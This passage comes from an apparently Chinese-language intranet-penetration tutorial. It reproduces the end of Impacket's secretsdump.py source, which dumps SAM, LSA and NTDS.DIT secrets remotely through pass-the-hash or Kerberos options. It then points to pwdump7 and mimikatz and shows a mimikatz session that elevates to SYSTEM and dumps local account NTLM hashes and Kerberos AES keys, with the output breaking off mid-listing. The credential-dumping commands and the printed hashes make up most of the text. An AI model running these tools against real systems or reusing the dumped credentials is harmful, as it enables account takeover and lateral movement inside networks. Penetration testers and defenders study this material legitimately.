class="string">&quot;ERROR_DS_NAME_ERROR_NOT_UNIQUE&quot;</span>) &gt;=<span class="number">0</span>:</span><br><span class="line">                    logging.info(<span class="string">&quot;You just got that error because there might be some duplicates of the same name. &quot;</span></span><br><span class="line">                                 <span class="string">&quot;Try specifying the domain name for the user as well. It is important to specify it &quot;</span></span><br><span class="line">                                 <span class="string">&quot;in the form of NetBIOS domain name/user (e.g. contoso/Administratror).&quot;</span>)</span><br><span class="line">                <span class="keyword">elif</span> self.__useVSSMethod <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">                    logging.info(<span class="string">&#x27;Something wen\&#x27;t wrong with the DRSUAPI approach. Try again with -use-vss parameter&#x27;</span>)</span><br><span class="line">            self.cleanup()</span><br><span class="line">        <span class="keyword">except</span> (Exception, KeyboardInterrupt) <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">if</span> logging.getLogger().level == logging.DEBUG:</span><br><span class="line">                <span class="keyword">import</span> traceback</span><br><span class="line">                traceback.print_exc()</span><br><span class="line">            logging.error(e)</span><br><span class="line">            <span class="keyword">if</span> self.__NTDSHashes <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">isinstance</span>(e, KeyboardInterrupt):</span><br><span class="line">                    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                        answer =  <span class="built_in">input</span>(<span class="string">&quot;Delete resume session file? [y/N] &quot;</span>)</span><br><span class="line">                        <span class="keyword">if</span> answer.upper() == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">                            answer = <span class="string">&#x27;N&#x27;</span></span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                        <span class="keyword">elif</span> answer.upper() == <span class="string">&#x27;Y&#x27;</span>:</span><br><span class="line">                            answer = <span class="string">&#x27;Y&#x27;</span></span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                        <span class="keyword">elif</span> answer.upper() == <span class="string">&#x27;N&#x27;</span>:</span><br><span class="line">                            answer = <span class="string">&#x27;N&#x27;</span></span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">if</span> answer == <span class="string">&#x27;Y&#x27;</span>:</span><br><span class="line">                        resumeFile = self.__NTDSHashes.getResumeSessionFile()</span><br><span class="line">                        <span class="keyword">if</span> resumeFile <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                            os.unlink(resumeFile)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                self.cleanup()</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cleanup</span>(<span class="params">self</span>):</span></span><br><span class="line">        logging.info(<span class="string">&#x27;Cleaning up... &#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> self.__remoteOps:</span><br><span class="line">            self.__remoteOps.finish()</span><br><span class="line">        <span class="keyword">if</span> self.__SAMHashes:</span><br><span class="line">            self.__SAMHashes.finish()</span><br><span class="line">        <span class="keyword">if</span> self.__LSASecrets:</span><br><span class="line">            self.__LSASecrets.finish()</span><br><span class="line">        <span class="keyword">if</span> self.__NTDSHashes:</span><br><span class="line">            self.__NTDSHashes.finish()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Process command-line arguments.</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># Explicitly changing the stdout encoding format</span></span><br><span class="line">    <span class="keyword">if</span> sys.stdout.encoding <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="comment"># Output is redirected to a file</span></span><br><span class="line">        sys.stdout = codecs.getwriter(<span class="string">&#x27;utf8&#x27;</span>)(sys.stdout)</span><br><span class="line"></span><br><span class="line">    print(version.BANNER)</span><br><span class="line"></span><br><span class="line">    parser = argparse.ArgumentParser(add_help = <span class="literal">True</span>, description = <span class="string">&quot;Performs various techniques to dump secrets from &quot;</span></span><br><span class="line">                                                      <span class="string">&quot;the remote machine without executing any agent there.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    parser.add_argument(<span class="string">&#x27;target&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;[[domain/]username[:password]@]&lt;targetName or address&gt; or LOCAL&#x27;</span></span><br><span class="line">                                                       <span class="string">&#x27; (if you want to parse local files)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-ts&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Adds timestamp to every logging output&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-debug&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Turn DEBUG output ON&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-system&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;SYSTEM hive to parse&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-bootkey&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;bootkey for SYSTEM hive&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-security&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;SECURITY hive to parse&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-sam&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;SAM hive to parse&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-ntds&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;NTDS.DIT file to parse&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-resumefile&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;resume file name to resume NTDS.DIT session dump (only &#x27;</span></span><br><span class="line">                         <span class="string">&#x27;available to DRSUAPI approach). This file will also be used to keep updating the session\&#x27;s &#x27;</span></span><br><span class="line">                         <span class="string">&#x27;state&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-outputfile&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;base output filename. Extensions will be added for sam, secrets, cached and ntds&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-use-vss&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, default=<span class="literal">False</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;Use the VSS method insead of default DRSUAPI&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-exec-method&#x27;</span>, choices=[<span class="string">&#x27;smbexec&#x27;</span>, <span class="string">&#x27;wmiexec&#x27;</span>, <span class="string">&#x27;mmcexec&#x27;</span>], nargs=<span class="string">&#x27;?&#x27;</span>, default=<span class="string">&#x27;smbexec&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Remote exec &#x27;</span></span><br><span class="line">                        <span class="string">&#x27;method to use at target (only when using -use-vss). Default: smbexec&#x27;</span>)</span><br><span class="line">    group = parser.add_argument_group(<span class="string">&#x27;display options&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-just-dc-user&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>, metavar=<span class="string">&#x27;USERNAME&#x27;</span>,</span><br><span class="line">                       <span class="built_in">help</span>=<span class="string">&#x27;Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI approach. &#x27;</span></span><br><span class="line">                            <span class="string">&#x27;Implies also -just-dc switch&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-just-dc&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, default=<span class="literal">False</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-just-dc-ntlm&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, default=<span class="literal">False</span>,</span><br><span class="line">                       <span class="built_in">help</span>=<span class="string">&#x27;Extract only NTDS.DIT data (NTLM hashes only)&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-pwd-last-set&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, default=<span class="literal">False</span>,</span><br><span class="line">                       <span class="built_in">help</span>=<span class="string">&#x27;Shows pwdLastSet attribute for each NTDS.DIT account. Doesn\&#x27;t apply to -outputfile data&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-user-status&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, default=<span class="literal">False</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;Display whether or not the user is disabled&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-history&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Dump password history, and LSA secrets OldVal&#x27;</span>)</span><br><span class="line">    group = parser.add_argument_group(<span class="string">&#x27;authentication&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    group.add_argument(<span class="string">&#x27;-hashes&#x27;</span>, action=<span class="string">&quot;store&quot;</span>, metavar = <span class="string">&quot;LMHASH:NTHASH&quot;</span>, <span class="built_in">help</span>=<span class="string">&#x27;NTLM hashes, format is LMHASH:NTHASH&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-no-pass&#x27;</span>, action=<span class="string">&quot;store_true&quot;</span>, <span class="built_in">help</span>=<span class="string">&#x27;don\&#x27;t ask for password (useful for -k)&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-k&#x27;</span>, action=<span class="string">&quot;store_true&quot;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Use Kerberos authentication. Grabs credentials from ccache file &#x27;</span></span><br><span class="line">                             <span class="string">&#x27;(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use&#x27;</span></span><br><span class="line">                             <span class="string">&#x27; the ones specified in the command line&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-aesKey&#x27;</span>, action=<span class="string">&quot;store&quot;</span>, metavar = <span class="string">&quot;hex key&quot;</span>, <span class="built_in">help</span>=<span class="string">&#x27;AES key to use for Kerberos Authentication&#x27;</span></span><br><span class="line">                                                                            <span class="string">&#x27; (128 or 256 bits)&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-keytab&#x27;</span>, action=<span class="string">&quot;store&quot;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Read keys for SPN from keytab file&#x27;</span>)</span><br><span class="line">    group = parser.add_argument_group(<span class="string">&#x27;connection&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-dc-ip&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>,metavar = <span class="string">&quot;ip address&quot;</span>,  <span class="built_in">help</span>=<span class="string">&#x27;IP Address of the domain controller. If &#x27;</span></span><br><span class="line">                                 <span class="string">&#x27;ommited it use the domain part (FQDN) specified in the target parameter&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-target-ip&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>, metavar=<span class="string">&quot;ip address&quot;</span>,</span><br><span class="line">                       <span class="built_in">help</span>=<span class="string">&#x27;IP Address of the target machine. If omitted it will use whatever was specified as target. &#x27;</span></span><br><span class="line">                            <span class="string">&#x27;This is useful when target is the NetBIOS name and you cannot resolve it&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)==<span class="number">1</span>:</span><br><span class="line">        parser.print_help()</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    options = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Init the example&#x27;s logger theme</span></span><br><span class="line">    logger.init(options.ts)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> options.debug <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">        logging.getLogger().setLevel(logging.DEBUG)</span><br><span class="line">        <span class="comment"># Print the Library&#x27;s installation path</span></span><br><span class="line">        logging.debug(version.getInstallationPath())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        logging.getLogger().setLevel(logging.INFO)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">    domain, username, password, remoteName = re.<span class="built_in">compile</span>(<span class="string">&#x27;(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)&#x27;</span>).match(</span><br><span class="line">        options.target).groups(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="comment">#In case the password contains &#x27;@&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;@&#x27;</span> <span class="keyword">in</span> remoteName:</span><br><span class="line">        password = password + <span class="string">&#x27;@&#x27;</span> + remoteName.rpartition(<span class="string">&#x27;@&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        remoteName = remoteName.rpartition(<span class="string">&#x27;@&#x27;</span>)[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> options.just_dc_user <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">if</span> options.use_vss <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">            logging.error(<span class="string">&#x27;-just-dc-user switch is not supported in VSS mode&#x27;</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">elif</span> options.resumefile <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            logging.error(<span class="string">&#x27;resuming a previous NTDS.DIT dump session not compatible with -just-dc-user switch&#x27;</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">elif</span> remoteName.upper() == <span class="string">&#x27;LOCAL&#x27;</span> <span class="keyword">and</span> username == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            logging.error(<span class="string">&#x27;-just-dc-user not compatible in LOCAL mode&#x27;</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># Having this switch on implies not asking for anything else.</span></span><br><span class="line">            options.just_dc = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> options.use_vss <span class="keyword">is</span> <span class="literal">True</span> <span class="keyword">and</span> options.resumefile <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        logging.error(<span class="string">&#x27;resuming a previous NTDS.DIT dump session is not supported in VSS mode&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> remoteName.upper() == <span class="string">&#x27;LOCAL&#x27;</span> <span class="keyword">and</span> username == <span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> options.resumefile <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        logging.error(<span class="string">&#x27;resuming a previous NTDS.DIT dump session is not supported in LOCAL mode&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> remoteName.upper() == <span class="string">&#x27;LOCAL&#x27;</span> <span class="keyword">and</span> username == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> options.system <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">and</span> options.bootkey <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            logging.error(<span class="string">&#x27;Either the SYSTEM hive or bootkey is required for local parsing, check help&#x27;</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> options.target_ip <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            options.target_ip = remoteName</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> domain <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            domain = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> options.keytab <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            Keytab.loadKeysFromKeytab(options.keytab, username, domain, options)</span><br><span class="line">            options.k = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> password == <span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> username != <span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> options.hashes <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">and</span> options.no_pass <span class="keyword">is</span> <span class="literal">False</span> <span class="keyword">and</span> options.aesKey <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">from</span> getpass <span class="keyword">import</span> getpass</span><br><span class="line"></span><br><span class="line">            password = getpass(<span class="string">&quot;Password:&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> options.aesKey <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            options.k = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    dumper = DumpSecrets(remoteName, username, password, domain, options)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        dumper.dump()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">if</span> logging.getLogger().level == logging.DEBUG:</span><br><span class="line">            <span class="keyword">import</span> traceback</span><br><span class="line">            traceback.print_exc()</span><br><span class="line">        logging.error(e)</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/57.png" alt="image-20200803152140006"></p><p>还可以用<strong>pwdump7.exe</strong>直接获取，下载地址如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.tarasco.org&#x2F;security&#x2F;pwdump_7&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/58.png" alt="image-20200803153049297"></p><p>还有<strong>mimikatz</strong>也可以</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;gentilkiwi&#x2F;mimikatz</span><br></pre></td></tr></table></figure><p>运行后如下</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\ascotbe&gt; .\mimikatz.exe</span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x86) #19041 Jul 15 2020 16:10:22</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line">Privilege <span class="string">&#x27;20&#x27;</span> OK</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># token::elevate</span></span><br><span class="line">Token Id  : <span class="number">0</span></span><br><span class="line">User name :</span><br><span class="line">SID name  : NT AUTHORITY\SYSTEM</span><br><span class="line"></span><br><span class="line"><span class="number">868</span>     &#123;<span class="number">0</span>;<span class="number">000003</span>e7&#125; <span class="number">1</span> D <span class="number">87942</span>          NT AUTHORITY\SYSTEM     S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-18</span>        (<span class="number">04</span>g,<span class="number">21</span>p)       Primary</span><br><span class="line"> -&gt; Impersonated !</span><br><span class="line"> * <span class="keyword">Process</span> Token : &#123;<span class="number">0</span>;<span class="number">04</span>c06ab9&#125; <span class="number">2</span> F <span class="number">589748425</span>   DESKTOP<span class="literal">-S5P5JJD</span>\ascotbe S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-3954380970</span><span class="literal">-1750975696</span><span class="literal">-2860310519</span><span class="literal">-1001</span> (<span class="number">17</span>g,<span class="number">24</span>p)        Primary</span><br><span class="line"> * Thread Token  : &#123;<span class="number">0</span>;<span class="number">000003</span>e7&#125; <span class="number">1</span> D <span class="number">590261325</span>   NT AUTHORITY\SYSTEM     S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-18</span>        (<span class="number">04</span>g,<span class="number">21</span>p)       Impersonation (Delegation)</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># lsadump::sam</span></span><br><span class="line">Domain : DESKTOP<span class="literal">-S5P5JJD</span></span><br><span class="line">SysKey : <span class="number">162</span>ff22be845ceffcb86ad9fc6f5b8fa</span><br><span class="line">Local SID : S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-3954380970</span><span class="literal">-1750975696</span><span class="literal">-2860310519</span></span><br><span class="line"></span><br><span class="line">SAMKey : c0776d417550ffc4c869dd75f05c783c</span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000001</span>f4 (<span class="number">500</span>)</span><br><span class="line">User : Administrator</span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000001</span>f5 (<span class="number">501</span>)</span><br><span class="line">User : Guest</span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000001</span>f7 (<span class="number">503</span>)</span><br><span class="line">User : DefaultAccount</span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000001</span>f8 (<span class="number">504</span>)</span><br><span class="line">User : WDAGUtilityAccount</span><br><span class="line">  Hash NTLM: ea5440b2fca105cdf6759f22e7c287d6</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM<span class="literal">-Strong</span><span class="literal">-NTOWF</span> *</span><br><span class="line">    Random Value : <span class="number">41</span>ccbf610919ce0103bd5f9f03349bf6</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos<span class="literal">-Newer</span><span class="literal">-Keys</span> *</span><br><span class="line">    Default Salt : WDAGUtilityAccount</span><br><span class="line">    Default Iterations : <span class="number">4096</span></span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : <span class="number">01</span>c68f20c20b145a433f03a4b8922e9da06a8452f94d18a51e839b2d72d7c8e7</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : <span class="number">9</span>b87d173421e72aec02ba1e0e1b043c8</span><br><span class="line">      des_cbc_md5       (<span class="number">4096</span>) : f229fdcb8cc20e2c</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM<span class="literal">-Strong</span><span class="literal">-NTOWF</span></span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : WDAGUtilityAccount</span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : f229fdcb8cc20e2c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000003</span>e9 (<span class="number">1001</span>)</span><br><span class="line">User : ascotbe</span><br><span class="line">  Hash NTLM: <span class="number">3</span>dbde697d71690a769204beb12283678</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM<span class="literal">-Strong</span><span class="literal">-NTOWF</span> *</span><br><span class="line">    Random Value : <span class="number">1</span>f3b3c572b6a2f91204b073d6f148738</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos<span class="literal">-Newer</span><span class="literal">-Keys</span> *</span><br><span class="line">    Default Salt : DESKTOP<span class="literal">-S5P5JJDascotbe</span></span><br><span class="line">    Default Iterations : <span class="number">4096</span></span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : e81117c0e58f31c5fc22e4ba480bb933c3b736986fc6975f714c79e22f8e7e1f</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : <span class="number">9</span>a4b1385fb0c7f0b763435c285d47037</span><br><span class="line">      des_cbc_md5       (<span class="number">4096</span>) : <span class="number">8985</span>a74fd6c8e5c4</span><br><span class="line">    OldCredentials</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : e81117c0e58f31c5fc22e4ba480bb933c3b736986fc6975f714c79e22f8e7e1f</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : <span class="number">9</span>a4b1385fb0c7f0b763435c285d47037</span><br><span class="line">      des_cbc_md5       (<span class="number">4096</span>) : <span class="number">8985</span>a74fd6c8e5c4</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM<span class="literal">-Strong</span><span class="literal">-NTOWF</span></span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : DESKTOP<span class="literal">-S5P5JJDascotbe</span></span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : <span class="number">8985</span>a74fd6c8e5c4</span><br><span class="line">    OldCredentials</span><br><span class="line">      des_cbc_md5       : <span class="number">8985</span>a74fd6c8e5c4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000003</span>ea (<span class="number">1002</span>)</span><br><span class="line">User : asc0t6e</span><br><span class="line">  Hash NTLM: <span class="number">32</span>ed87bdb5fdc5e9cba88547376818d4</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM<span 